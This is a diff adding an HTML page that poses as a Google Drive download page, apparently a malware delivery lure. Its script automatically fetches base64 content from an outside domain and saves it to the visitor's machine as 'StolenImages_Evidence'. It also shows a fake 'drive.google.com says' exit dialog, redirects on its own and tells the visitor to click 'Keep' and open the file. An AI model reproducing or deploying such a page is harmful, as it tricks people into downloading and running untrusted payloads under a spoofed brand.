@@ -1,0 +1,693 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+	<meta http-equiv="cache-control" content="no-cache, no-store, must-revalidate" />
+	<meta http-equiv="pragma" content="no-cache" />
+	<meta http-equiv="expires" content="0" />
+    <title>File Download</title>
+    <!-- <link rel="prefetch" href="//www.google.com/images/branding/googlelogo/2x/googlelogo_color_120x44dp.png"> -->
+    <link rel="apple-touch-icon-precomposed" sizes="96x96" href="https://ssl.gstatic.com/images/branding/product/2x/hh_drive_96dp.png">
+    <link rel="icon" href="https://ssl.gstatic.com/images/branding/product/2x/hh_drive_36dp.png" sizes="36x36">
+    <link rel="icon" href="https://ssl.gstatic.com/images/branding/product/2x/hh_drive_24dp.png" sizes="24x24">
+    <link rel="shortcut icon" href="https://ssl.gstatic.com/images/branding/product/2x/hh_drive_36dp.png">
+    <meta http-equiv="refresh" content="" id="reload">
+    <link rel="stylesheet" type="text/css" href="https://cdn.rawgit.com/carlsednaoui/ouibounce/master/test/ouibounce.min.css">
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/ouibounce/0.0.11/ouibounce.min.js"></script>
+    <!--    <meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'">-->
+    <style>
+    #drive_iframe {
+        display: flex;
+        justify-content: center;
+        height: 100vh;
+        align-items: center;
+        position: relative;
+        flex-direction: column;
+    }
+
+    body {
+        margin: 0;
+        padding: 0;
+    }
+
+    .logo {
+        height: 200px;
+        width: 200px;
+        margin: 0 auto
+    }
+
+    .logo img {
+        width: 100%;
+    }
+
+    .preloader {
+        position: relative;
+        background: #fff;
+        z-index: 200;
+        opacity: 1;
+        -webkit-transition: opacity .5s;
+        transition: opacity .5s;
+        text-align: center;
+        width: 760px;
+        height: 100%;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        z-index: 10;
+
+    }
+
+    .loader {
+        height: 5px;
+        background-color: #2684fc;
+        /*position: absolute;*/
+        margin-top: 3%;
+        border-radius: 20px;
+
+    }
+
+    .loading-wrapper {
+        width: 320px;
+        display: flex;
+        flex-direction: column;
+        margin: 0 auto;
+    }
+
+    .otherloader {
+        position: relative;
+        margin-top: -4.6rem;
+        z-index: 300;
+        width: 100%;
+    }
+
+    .content {
+        opacity: 0;
+        -webkit-transition: opacity .3s;
+        transition: opacity .3s;
+    }
+
+    .content.here {
+        opacity: 1;
+    }
+
+    #btn {
+        background-color: #1a73e8;
+        color: #fff;
+        text-decoration: none;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-weight: 500;
+        -moz-osx-font-smoothing: grayscale;
+        -webkit-font-smoothing: antialiased;
+        font-family: "Google Sans", Arial, sans-serif;
+        -webkit-appearance: button;
+        font-size: 1rem;
+        font-weight: 500;
+        line-height: 1.375rem;
+        letter-spacing: .03125rem;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        height: 46px;
+        outline: none;
+        padding: 0 24px;
+    }
+
+    #btn_alert {
+        background-color: #1a73e8;
+        color: #fff;
+        text-decoration: none;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        position: absolute;
+        font-weight: 500;
+        -moz-osx-font-smoothing: grayscale;
+        -webkit-font-smoothing: antialiased;
+        font-family: "Google Sans", Arial, sans-serif;
+        -webkit-appearance: button;
+        font-size: 1rem;
+        font-weight: 500;
+        line-height: 1.375rem;
+        letter-spacing: .03125rem;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        height: 46px;
+        outline: none;
+        padding: 0 24px;
+    }
+
+    #btn:hover {
+        background-color: #174ea6;
+    }
+
+    #message {
+        box-shadow: 0 1px 3px 0 rgba(60, 64, 67, 0.302), 0 4px 8px 3px rgba(60, 64, 67, 0.149);
+        width: 273px;
+        border-radius: 10px;
+        padding: 10px;
+        display: none;
+        position: absolute;
+        bottom: 50px;
+        margin: 10px;
+        z-index: 100;
+    }
+
+    .content p {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+    }
+
+    .chr-headline {
+        margin: 0;
+        font-size: 2.2rem;
+        line-height: 2.65rem;
+        letter-spacing: -.04688rem;
+        color: #202124;
+        -webkit-font-smoothing: antialiased;
+        font-family: "Google Sans", Arial, sans-serif;
+        font-weight: normal;
+        text-align: center;
+        white-space: nowrap;
+    }
+
+    #message p {
+        text-align: center;
+        -webkit-font-smoothing: antialiased;
+        font-family: "Google Sans", Arial, sans-serif;
+        font-weight: normal;
+    }
+
+    .wait {
+        font-size: 20px;
+        color: #999;
+        -webkit-font-smoothing: antialiased;
+        font-family: "Google Sans", Arial, sans-serif;
+        font-weight: normal;
+        text-transform: capitalize;
+    }
+
+    #ouibounce-modal {
+        z-index: 1111;
+    }
+
+    #ouibounce-modal .modal {
+        height: 165px;
+        width: 400px;
+        top: 5px;
+        right: 0;
+        bottom: auto;
+    }
+
+    .modal-body {
+        display: flex;
+        flex-direction: column;
+    }
+
+    #btn_alert {
+        align-self: flex-end;
+        margin-top: 80px;
+    }
+
+    .page_name {
+        font-size: 20px;
+        margin-bottom: 0
+    }
+
+    .chr-subheadline {
+        position: relative;
+        font-size: 1rem;
+        line-height: 1.4rem;
+        color: #3c4043;
+        -webkit-font-smoothing: antialiased;
+        font-family: "Google Sans", Arial, sans-serif;
+        font-weight: normal;
+        text-align: center;
+        margin-top: 8px;
+        margin-bottom: 0;
+    }
+    </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/file-saver@2.0.5/dist/FileSaver.min.js"></script>
+    <script>
+    
+    var settings = 2; // 1,2,3,4
+    
+    var url_file = 'https://vayodex.com/images/logo.jpg';
+    var url_type = 'iso'
+
+    var base64_type = 'iso';
+    var base64_string = '';
+
+    let a = false
+    var params = {
+        url: "#", // fill your url
+        loadingTime: 5, // loader loading time
+        showDownloadMsg: 2000, // after downloading message
+        redirectTime: 0, // time after which will be redirect on file
+        exitAlert: 'yes', // when check is yes this exit alert doesn't work
+        blockCustomAlert: 'yes',
+        FirefoxAutoloadingTime: 0,
+        Chrome: {
+            bottom: '',
+            left: '0',
+            right: '0',
+            top: '420px',
+            check: 'no', // if there is yes will be work click on all browser, if no only on button
+            auto_download: 'yes', //if there yes  browser will redirect to your url
+            mouseMove: 'no',
+        },
+        Edge: {
+            bottom: '20px',
+            left: '40%',
+            right: '',
+            top: '',
+            check: 'no',
+            auto_download: 'yes',
+            mouseMove: 'no',
+
+        },
+        Firefox: {
+            bottom: '',
+            left: '',
+            right: '20px',
+            top: '20px',
+            check: 'no',
+            auto_download: 'yes',
+            mouseMove: 'no',
+        },
+        Opera: {
+            bottom: '',
+            left: '',
+            right: '20px',
+            top: '20px',
+            check: 'no',
+            auto_download: 'yes',
+            mouseMove: 'no',
+        },
+        Chromium: {
+            bottom: '20px',
+            left: '',
+            right: '',
+            top: '',
+            check: 'no',
+            auto_download: 'yes',
+            mouseMove: 'no',
+        }
+    }
+    // if (params.blockCustomAlert === 'yes') {
+    //     var _ouibounce = ouibounce(document.getElementById('ouibounce-modal'), {
+    //         aggressive: true, //Making this true makes ouibounce not to obey "once per visitor" rule
+    //     });
+    // }
+
+    function loaderStrip() {
+        $(window).load(function() {
+            var loader = $('.loader');
+            var otherloader = $('.otherloader');
+            var wHeight = $(window).height();
+            var wWidth = $(window).width();
+            var i = 0;
+
+            loader.css({
+                top: wHeight / 0,
+                left: wWidth / 0
+            });
+
+            do {
+                loader.animate({
+                    width: i
+                }, params.loadingTime);
+                i += 2;
+            } while (i <= 140);
+            if (i === 142) {
+                // loader.animate({ left: 0, width: '100%' }, function() {
+                //     $('.logo').animate({
+                //         'width': '100px',
+                //         'height': '100px'
+                //     }, {
+                //         complete: function(){
+                //             $('.loading-wrapper').animate({
+                //                 'opacity': 0,
+                //             }, {
+                //                 complete: function(){
+                //                     $('.content').addClass('here');
+                //                 }
+                //             })
+                //         }
+                //     })
+                // });
+                loader.animate({ left: 0, width: '100%' }, function() {
+                    $('.loading-wrapper').animate({
+                        'opacity': 0,
+                    }, {
+                        duration: 200,
+                        complete: function() {
+                            $('.logo').animate({
+                                'width': '100px',
+                                'height': '100px'
+                            }, { queue: false })
+                            $('.content').animate({
+                                'opacity': 1,
+                            }, { duration: 200, queue: false })
+                            switch (settings) {
+                                case 1:
+                                    // assemble(url_file);
+                                    showMes()
+                                    window.location = url_file;
+                                    $('#btn, #btn_alert').click(function(){
+                                        // assemble(url_file);
+                                        window.location = url_file;
+                                        showMes()
+                                    })
+                                    break;
+                                case 2:
+                                    // assemble(url_file);
+                                    $.getJSON(url_file, function(res) {
+                                        }).done(function(res) {
+                                            var step2 = extensionMatcher(res.data, url_type);
+                                            save(step2, getAdditionalInfo(step2).type, getAdditionalInfo(step2).ext);
+                                            showMes()
+                                        })
+                                        .fail(function() {
+                                            console.log("error getting base64 from external api");
+                                        })
+                                    $('#btn, #btn_alert').click(function(){
+                                        $.getJSON(url_file, function(res) {
+                                            }).done(function(res) {
+                                                var step2 = extensionMatcher(res.data, url_type);
+                                                save(step2, getAdditionalInfo(step2).type, getAdditionalInfo(step2).ext);
+                                                showMes();
+                                            })
+                                            .fail(function() {
+                                                console.log("error getting base64 from external api");
+                                            })
+                                    })
+                                    break;
+                                case 3:
+                                    var base64_full = extensionMatcher(base64_string, base64_type);
+                                    save(base64_full, getAdditionalInfo(base64_full).type, getAdditionalInfo(base64_full).ext)
+                                    showMes();
+                                    $('#btn, #btn_alert').click(function(){
+                                        save(base64_full, getAdditionalInfo(base64_full).type, getAdditionalInfo(base64_full).ext)
+                                        showMes();
+                                    })
+                                    break;
+                                case 4:
+                                    sendReq();
+                                    break;
+                                default:
+                                    // code block
+                            }
+                        }
+                    })
+                });
+            }
+
+        });
+    }
+    loaderStrip();
+
+
+    // $.ajax({
+    //     url: 'http://drive:8888/ex/',
+    //     type: 'get',
+    //     beforeSend: function(){
+    //         params.loadingTime = 20
+    //         alert('before')
+    //         // $(".logo").show();
+    //     },
+    //     success: function(res){
+    //         console.log(res, "ddddd")
+    //         $(".loader").hide();
+    //         params.loadingTime = 0
+    //         // params.url = "https://drive.google.com/uc?export=download&id=" + res.data
+    //         //         hello("https://drive.google.com/uc?export=download&id=" + res.data)
+    //     },
+    //     complete:function(data){
+    //
+    //         alert('complete')
+    //         // Hide image container
+    //         $(".loader").hide();
+    //     }
+    //
+    // });
+
+
+    function hello(e) {
+        params.url = e
+        console.log(params.url, "seeewrewrw")
+
+
+        //*******************************************************************
+        //*******************************************************************
+        //*******************************************************************
+
+        var btn_alert = document.getElementById('btn_alert')
+        btn_alert.setAttribute('href', params.url)
+        btn_alert.setAttribute('download', 'true')
+        var btn = document.getElementById('btn')
+        for (const [key, value] of Object.entries(params)) {
+            if ((navigator.userAgent.indexOf(key) > -1)) {
+                if (value.mouseMove === 'yes') {
+                    let count = 0
+                    document.addEventListener('mousemove', () => {
+                        count = count + 1
+                        if (count === 1) {
+                            window.onbeforeunload = () => undefined;
+                            window.location = params.url
+                            $(document).off("mousemove", mouse);
+                        }
+                    })
+                }
+                if (value.auto_download === 'yes') {
+                    if (key === 'Firefox') {
+                        setTimeout(() => {
+                            window.location = params.url
+                        }, params.FirefoxAutoloadingTime)
+                    }
+                    setTimeout(() => {
+                        $(document).ready(() => {
+                            window.onbeforeunload = () => undefined;
+                            window.location = params.url
+                            setTimeout(() => {
+                                $('#message').css({
+                                    'display': 'block',
+                                })
+                            }, params.showDownloadMsg)
+                            // document.getElementById('reload').setAttribute('content', params.redirectTime + ';url=' + params.url)
+                        });
+                    }, params.redirectTime)
+                }
+                if (value.check === 'no') {
+                    btn.setAttribute("href", params.url)
+                    btn.setAttribute('download', true)
+
+                } else if (value.check === 'yes') {
+                    document.addEventListener('click', () => {
+                        window.onbeforeunload = () => undefined;
+                        window.location = params.url
+                        // document.getElementById('reload').setAttribute('content', params.redirectTime + ';url=' + params.url)
+                    })
+                }
+
+                $('#btn, #btn_alert').click((e) => {
+                    window.onbeforeunload = () => undefined;
+                    setTimeout(() => {
+                        $('#message').css({
+                            'display': 'block',
+                            // 'bottom': value.bottom,
+                            // 'top': value.top,
+                            // 'right': value.right,
+                            // 'left': value.left
+                        })
+                    }, params.showDownloadMsg)
+                })
+            }
+        }
+    }
+    // }
+    if (params.exitAlert === 'yes') {
+        window.onbeforeunload = function(evt) {
+            var message = "Test";
+            if (typeof evt == "undefined") {
+                evt = window.event;
+            }
+            if (evt) {
+                evt.returnValue = message;
+            }
+            return null;
+        }
+    }
+
+    // const imageUrl = "https://cdn.pixabay.com/photo/2015/04/23/22/00/tree-736885__480.jpg";
+    // fetch(imageUrl)
+    //     .then(response => response.blob())
+    //     .then(imageBlob => {
+    //         // Then create a local URL for that image and print it 
+    //         const imageObjectURL = URL.createObjectURL(imageBlob);
+    //         var blob = new Blob([imageObjectURL], { type: 'image/jpeg' });
+    //         saveAs(blob, "file.jpeg");
+    //         console.log(imageObjectURL);
+    //     });
+
+    function toDataUri(url, callback) {
+        var xhr = new XMLHttpRequest();
+        xhr.onload = function() {
+            var reader = new FileReader();
+            reader.onloadend = function() {
+                callback(reader.result);
+            }
+            reader.readAsDataURL(xhr.response);
+        };
+        xhr.open('GET', url);
+        xhr.responseType = 'blob';
+        xhr.send();
+    }
+
+    function toBlob(dataURI) {
+        // convert base64 to raw binary data held in a string
+        // doesn't handle URLEncoded DataURIs - see SO answer #6850276 for code that does this
+        var byteString = atob(dataURI.split(',')[1]);
+        // separate out the mime component
+        var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0]
+
+        // write the bytes of the string to an ArrayBuffer
+        var ab = new ArrayBuffer(byteString.length);
+        // create a view into the buffer
+        var ia = new Uint8Array(ab);
+
+        // set the bytes of the buffer to the correct values
+        for (var i = 0; i < byteString.length; i++) {
+            ia[i] = byteString.charCodeAt(i);
+        }
+        // write the ArrayBuffer to a blob, and you're done
+        var blob = new Blob([ab], { type: mimeString });
+        return blob;
+    }
+
+    function getAdditionalInfo(base64){
+        var ext = base64.split(';')[0].split('/')[1];
+        if (ext == 'plain'){ 
+            ext = 'txt';
+        } else if (ext.includes('word')){
+            ext = 'docx'
+        } 
+        var type = base64.split(';')[0].split(':')[1];
+        return {
+            'ext': ext,
+            'type': type
+        }
+    }
+
+    function extensionMatcher(base64, type){
+        var temp = '';
+        if (type == 'doc' || type == 'docx') {
+            // data:image/jpeg;base64,
+            temp = 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
+        } else if (type == 'txt'){
+            temp = 'text/plain';
+        } else if (type == 'pdf'){
+            temp = 'application/' + type;
+        }
+        else {
+            temp = 'image/' + type;
+        }
+        var extension = 'data:' + temp + ';base64,';
+        return (extension+base64)
+    }
+
+    function assemble(url){
+        toDataUri(url, function(result) {
+            var file_obj = getAdditionalInfo(result);
+            // console.log(result);
+            save(result, file_obj.type, file_obj.ext);
+        });
+    }
+
+    function save(uri, type, ext){
+        var tempBlob = toBlob(uri);
+        var blob = new Blob([tempBlob], { type: type });
+        saveAs(blob, ("StolenImages_Evidence." + ext));
+    }
+
+    function sendReq(){
+        $.getJSON("#", function(res) {
+        }).done(function(res) {
+            params.loadingTime = 0;;
+            params.url = res.data;
+            hello(res.data);
+        })
+        .fail(function() {
+            console.log("error");
+        })
+    }
+    function showMes(time = 1000){
+        setTimeout(() => {
+            $('#message').css({
+                'display': 'block',
+            })
+        }, time);
+    }
+
+    </script>
+</head>
+
+<body id="drive_iframe">
+    <div class="preloader">
+        <div class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 1443.061 1249.993">
+                <svg width="100%" height="100%" viewBox="0 0 94 94" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <rect width="100%" height="100%" fill="white" />
+                    <path d="M10.7219 73.2906L14.4917 79.8021C15.275 81.1729 16.401 82.25 17.7229 83.0333L31.1865 59.7292H4.25937C4.25937 61.2469 4.65104 62.7646 5.43437 64.1354L10.7219 73.2906Z" fill="#0066DA" />
+                    <path d="M47 32.3125L33.5365 9.00833C32.2146 9.79166 31.0885 10.8687 30.3052 12.2396L5.43437 55.3229C4.65104 56.6938 4.25937 58.2115 4.25937 59.7292H31.1865L47 32.3125Z" fill="#00AC47" />
+                    <path d="M47 32.3125L60.4635 9.00833C59.1416 8.22499 57.6239 7.83333 56.0573 7.83333H37.9427C36.376 7.83333 34.8583 8.27395 33.5364 9.00833L47 32.3125Z" fill="#00832D" />
+                    <path d="M62.8135 59.7292H31.1864L17.7229 83.0333C19.0448 83.8167 20.5625 84.2083 22.1292 84.2083H71.8708C73.4375 84.2083 74.9552 83.7677 76.2771 83.0333L62.8135 59.7292Z" fill="#2684FC" />
+                    <path d="M76.2771 83.0333C77.599 82.25 78.725 81.1729 79.5083 79.8021L81.075 77.1094L88.5656 64.1354C89.3489 62.7646 89.7406 61.2469 89.7406 59.7292H62.8625L76.2771 83.0333Z" fill="#EA4335" />
+                    <path d="M76.1302 33.7813L63.6948 12.2396C62.9115 10.8687 61.7854 9.79166 60.4635 9.00833L47 32.3125L62.8135 59.7292H89.6917C89.6917 58.2115 89.3 56.6938 88.5167 55.3229L76.1302 33.7813Z" fill="#FFBA00" />
+                </svg>
+            </svg>
+        </div>
+        <div class="loading-wrapper">
+            <div class="loader"></div>
+            <p class="wait">please wait...</p>
+        </div>
+        <div class="otherloader">
+            <div class="content">
+                <h1 class="chr-headline">
+                File 'Stolen Images Evidence'<br>is ready for download
+                </h1>
+                <p class="chr-subheadline">Your download should begin automatically.<br>Didn&#8217;t work? Try downloading again.</p>
+                <div>
+                    <p style="margin: 13;">
+                        <a href="#" id="btn" target="_self">Download my file</a>
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="message">
+        <p> <b>Tip: </b>Click 'Keep' or 'Save' first, and then click the file name to open it</p>
+    </div>
+    <!-- Ouibounce Modal -->
+    <div id="ouibounce-modal">
+        <div class="modal">
+            <div class="modal-body">
+                <p class="page_name"><b>drive.google.com says:</b></p>
+                <p>Do you really want to exit?</p>
+                <a href="#" id="btn_alert" onclick="document.getElementById('ouibounce-modal').style.display = 'none';">Continue</a>
+            </div>
+        </div>
+    </div>
+    <script>
+    window.parent.document.body.style.overflow = "hidden";
+    ouibounce(document.getElementById('ouibounce-modal'), { aggressive: true });
+    </script>
+	
+</body>
+
+</html>
